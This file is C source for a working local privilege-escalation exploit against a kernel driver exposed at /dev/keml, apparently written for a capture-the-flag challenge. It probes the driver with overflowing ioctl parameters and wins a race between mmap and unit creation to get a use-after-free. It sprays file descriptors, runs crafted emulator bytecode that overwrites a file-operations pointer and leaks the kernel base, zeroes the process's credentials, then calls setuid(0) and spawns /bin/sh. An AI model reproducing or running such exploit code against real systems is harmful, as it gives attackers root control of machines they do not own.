#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <pthread.h>

#define IOCTL_NEW_EMUL_UNIT   _IOWR('k', 1, void *)
#define IOCTL_GET_EMUL_UNIT   _IOWR('k', 4, void *)
#define IOCTL_DEL_EMUL_UNIT   _IOWR('k', 5, int)
#define IOCTL_ISSUE_ORDER     _IOWR('k', 3, void *)

#define FAIL(s) do { printf("Failed to " s "\n"); } while (0)

struct keml_create_unit {
	unsigned pages;
	int id;
};

struct keml_issue_order {
	size_t n_instrs;
	long *instrs;
	size_t n_units;
	int *units;
};

int keml_fd = 0;
volatile int do_race = 0;
volatile int race_thread_ready = 0;
volatile int race_won = 0;
struct keml_create_unit *race_args = NULL;
volatile int ioctl_failure = 0;
volatile int next_attempt = 33;
volatile int won_with = 0;
void *leak_map;

volatile int race2_thread_ready = 0;
volatile int do_race2 = 0;

int hijacked_fds[1024] = {0};

void race_it() {
	int i;
	unsigned long err;

	printf("In race thread...\n");
	race_thread_ready = 1;
	while (1) {
		if (do_race) {
			err = mmap(NULL, 4 * 0x1000, PROT_READ, MAP_PRIVATE, keml_fd, 
							   33 * 0x1000);
			if (err != -1)  {
				printf("RACE WON %p\n", err);  
				race_won = 1;
				leak_map = err;
				break;
			}	
		}
	}
	race2_thread_ready = 1;
	while (!do_race2) { ; }
	printf("Issuing destroy\n");
	ioctl(keml_fd, IOCTL_DEL_EMUL_UNIT, 33);

	munmap(leak_map, 0x4000);
	printf("Destroyed, but ref still exists\n");
	
	for(i=0;i<512;i++) {
		//hijacked_fds[i] = open("/proc/self/cmdline", O_RDONLY);
		hijacked_fds[i] = open("/etc/passwd", O_RDONLY);
	}	
}

unsigned long read_long(int fd, unsigned long addr) {
	unsigned long ret = 0;
	addr -= 0x18;
	ret = lseek(fd, addr, 0);
	printf("ret: %x\n", ret);
	unsigned long tmp = lseek(fd, addr+4, 0);
	ret = (tmp << 32) | (ret);
	printf("ret: %lx\n", ret);
	return ret;
}

void write_zero(int fd, unsigned long addr) {
	ioctl(fd, 0x1337, addr - 0x1ac);
}

int main(void) {
	// first some tests
	int fd = open("/dev/keml", O_RDONLY);
	printf("Keml at fd %d\n", fd);

	keml_fd = fd;

	int i;
	struct keml_create_unit cu = {1, 0};
	int id = 0;
	for (i=0;i<32;i++) {
		ioctl(fd, IOCTL_NEW_EMUL_UNIT, &cu);
		printf("cu.id: %d\n", cu.id);
	}

	unsigned long err = mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0x4000);
	if (err == -1) {
		FAIL("mmap unit 4");
	}

	err = mprotect(err, 0x1000, PROT_READ|PROT_WRITE);
	if (err) FAIL("mprotect unit 4");

	err = ioctl(fd, IOCTL_DEL_EMUL_UNIT, 4);

	err = ioctl(fd, IOCTL_DEL_EMUL_UNIT, 4);
	if (err) FAIL("delete unit 4");


	//unsigned int instructions[4] = {0x00010100, 0x01010101, 0, 0};
	unsigned char *instructions = \
		"\x00\x01\x00\xff" \
		"\x00\x02\x00\xcc" \
		"\x08\x01\x01\x00" \
		"\x0a\x00\x01\x00" \

		"\x02\x00\x00\x20" \
		"\x03\x00\x00\x02" \
		"\x08\x00\x00\x01" \
		"\x09\x00\x00\x02" \

		"\x0b\x03\x00\x02" \
		"\x09\x03\x00\x03" \
		"\x00\x04\x00\x34" \
		"\x0f\x00\x00\x04" \

		"\xff\xff\xff\xff" \
		"\x00\x0f\x00\x03" \
		"\x0c\x0f\x00\x00" \
		"\x10\x00\x00\x48" \

		"\x04\x0f\x00\x01" \
		"\x0e\x00\x00\x38" \
		"\x00\x10\x22\x22" \
		"\x18\x00\x00\x50" \
		"\x1d\x00\x00\x00";

	int handles[4] = {1, 2, 3, 5};
	struct keml_issue_order io;

	io.n_instrs = 0x54/4;
	io.instrs = instructions;
	io.n_units = 4;
	io.units = &handles;

	err = ioctl(keml_fd, IOCTL_ISSUE_ORDER, &io);
	if (err) {
		printf("err: %d\n", err);
		FAIL("issue order with sane params");
		return 1;
	}

	io.n_instrs = -1;
	err = ioctl(keml_fd, IOCTL_ISSUE_ORDER, &io);
	if (err) {
		FAIL("Issuing orders with overflowing instrs");
	}

	io.n_instrs = 4;
	io.n_units = 17;
	err = ioctl(keml_fd, IOCTL_ISSUE_ORDER, &io);
	if (err) {
		FAIL("Issuing order with overflowing units");
	}

	void *w = mmap(0, 0x1000, PROT_READ, MAP_PRIVATE, keml_fd, 0x1000);
	if (w == MAP_FAILED) {
		FAIL("mmap for emulation test");
		return -1;
	}	

	unsigned long *wmap = (unsigned long *)w;
	for(i=0;i<0x1000/8;i++) {
		if (wmap[i]) {
			printf("Found something [%d] %lx\n", i, wmap[i]);
		}
	}

	// now exploit
	pthread_t thread_id;
	err = pthread_create(&thread_id, NULL, &race_it, NULL);
	printf("Err: %d\n", err);

	while(!race_thread_ready) { ; }
	do_race = 1;
	while(!race_won) {
		void *args = mmap(0, 0x2000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, 0, 0);
		munmap(args + 0x1000, 0x1000);
		struct keml_create_unit *p = (struct keml_create_unit *)(args + 0xffc);
		p->pages = 4;
		ioctl(fd, IOCTL_NEW_EMUL_UNIT, p);
	}

	unsigned long *leak_ints = (unsigned long *)leak_map;
	for(i=0;i<(4*0x1000)/8;i++) {
		if (leak_ints[i]) {
			printf("Found something [%d] %lx\n", i, leak_ints[i]);
		}
	}

	printf("Race has been won, only 1 ref on unit now\n");

	struct keml_create_unit copy_unit;
	copy_unit.pages = 4;

	err = ioctl(fd, IOCTL_NEW_EMUL_UNIT, &copy_unit);
	if (err) {
		printf("failed to set up copy unit\n");	
		return 1;
	}

	/* 0x28 is an fops */
	unsigned char *long_loop = \
		"\x00\x01\x01\x01" \
		"\x00\x00\xff\xff" \
		"\x04\x00\x00\x01" \
		"\x0c\x00\x00\x00" \

		// 0x10
		"\x16\x00\x00\x08" \
		"\x04\x01\x00\x01" \
		"\x0c\x01\x00\x00" \
		"\x16\x00\x00\x04" \

		// 0x20
		"\x06\x01\x00\xff" \
		"\x00\xff\x00\x02" \
		"\x04\xff\x00\x01" \
		"\x0c\xff\x00\x00" \

		// 0x30
		"\x10\x00\x00\x38" \
		"\x18\x00\x00\x28" \
		// copy a ll pointer in the next object 
		// and write over the fops ptr with it
		"\x00\x09\x00\x8f" \
		"\x0a\x04\x01\xd0" \

		// 0x40
		"\x0a\x05\x01\xd1" \
		"\x0a\x06\x01\xd2" \
		"\x0a\x07\x01\xd3" \
		"\x0a\x08\x01\xd4" \

		// 0x50
		"\x0a\x09\x01\xd5" \ 
		"\x0a\x0a\x01\xd6" \
	  "\x0a\x0b\x01\xd7" \
		// begin copying it over the fop
		"\x08\x0b\x00\x2f" \

		// 0x60
		"\x08\x0a\x00\x2e" \
		"\x08\x09\x00\x2d" \
		"\x08\x08\x00\x2c" \
		"\x08\x07\x00\x2b" \

		// 0x70
		"\x08\x06\x00\x2a" \
		"\x08\x05\x00\x29" \
		"\x08\x04\x00\x28" \
		// obtain kernel base address
		"\x0a\x04\x01\x28" \

		// 0x80
		"\x0a\x05\x01\x29" \
		"\x0a\x06\x01\x2a" \
		"\x0a\x07\x01\x2b" \
		"\x0a\x08\x01\x2c" \

		// 0x90
		"\x0a\x09\x01\x2d" \
		"\x0a\x0a\x01\x2e" \
		"\x0a\x0b\x01\x2f" \
		"\x04\x05\x00\x5b" \

		// 0xa0
		"\x0c\x06\x00\xc1" \
		"\x14\x06\x00\xac" \
		"\x04\x07\x00\x01" \
		"\x04\x06\x00\xc2" \

		// 0xb0
		"\x01\x00\x00\x04" \
		"\x01\x01\x00\x05" \
		"\x01\x02\x00\x06" \
		"\x02\x04\x00\x4a" \

		// 0xc0
		"\x02\x05\x00\x8a" \
		"\x02\x06\x00\x17" \
		"\x08\x04\x01\xd8" \
		"\x08\x05\x01\xd9" \

		// 0xd0
		"\x08\x06\x01\xda" \
		"\x08\x07\x01\xdb" \
		"\x08\x08\x01\xdc" \
		"\x08\x09\x01\xdd" \

		// 0xe0
		"\x08\x0a\x01\xde" \
		"\x08\x0b\x01\xdf" \
		// add offset of the store gadget
		"\x02\x00\x00\x1f" \
		"\x02\x01\x00\x69" \

		// 0xf0
		"\x02\x02\x00\x01" \
		"\x08\x00\x02\x20" \
		"\x08\x01\x02\x21" \
		"\x08\x02\x02\x22" \

		// 0x100
		"\x08\x07\x02\x23" \
		"\x08\x08\x02\x24" \
		"\x08\x09\x02\x25" \
		"\x08\x0a\x02\x26" \

		// 0x110
		"\x08\x0b\x02\x27" \
		"\x00\x00\x00\x00" \
		"\x00\x01\x40\x00" \
		"\x0b\x02\x00\x00" \

		// 0x120
		"\x09\x02\x00\x01" \
		"\x02\x00\x00\x01" \
		"\x02\x01\x00\x01" \
		"\x0c\x00\x40\x00" \

		// 0x130
		"\x16\x00\x01\x1c" \
		"\x06\x03\x00\xff";

	struct keml_issue_order ioll;

	printf("copy unit handle: %d\n", copy_unit.id);
	int xh[2] = {33, copy_unit.id};

	ioll.n_instrs = 0x138 / 4 ;
	ioll.instrs = long_loop;
	ioll.n_units = 2;
	ioll.units = &xh;

	while (!race2_thread_ready) {;}
	do_race2 = 1;
	ioctl(fd, IOCTL_ISSUE_ORDER,  &ioll);

	err = mmap(0, 0x4000, PROT_READ, MAP_PRIVATE, fd, copy_unit.id * 0x1000);
	if (err == MAP_FAILED) {
		FAIL("mmap copy out");
		return 1;
	}


	unsigned long *copy_out_ints = (unsigned long *)err;
	for(i=0;i<(4*0x1000)/8;i++) {
		if (copy_out_ints[i]) {
			printf("Found something [%d] %lx\n", i, copy_out_ints[i]);
		}
	}
	printf("DONE\n");
	unsigned long self = copy_out_ints[5];

	int control_fd = 0;
	off_t lret = 0;
	for (i=0;i<1024;i++) {
		lret = lseek(hijacked_fds[i], self - 0x18, 0);
		if (lret != -1) {
			printf("lret: %x\n", lret);
			control_fd = hijacked_fds[i];	
			lret = lseek(control_fd, self - 0x18 , 0);
			printf("lret: %x\n", lret);
			break;
		}
	}
	printf("control_fd: %d\n", control_fd);
	
	unsigned long generic_file_llseek = read_long(control_fd, copy_out_ints[485] + 8);
	printf("generic_file_llseek: %lx\n", generic_file_llseek);

	
	unsigned long credptr = copy_out_ints[466];
	printf("credptr: %lx", credptr);
	unsigned long cred = read_long(control_fd, credptr + 4);
	printf("cred: %lx\n", cred);

	write_zero(control_fd, credptr + 4);
	write_zero(control_fd, credptr + 8);

	
	cred = read_long(control_fd, credptr + 4);
	printf("cred: %lx\n", cred);

	printf("getuid(): :%d\n", getuid());
	if (setuid(0)) {
		FAIL("setuid(0)");
		return 1;
	}
	char *binsh = "/bin/sh";
	char *argv[2] = {binsh, NULL};
	
	execve(binsh, argv, NULL);
	return 0;
}
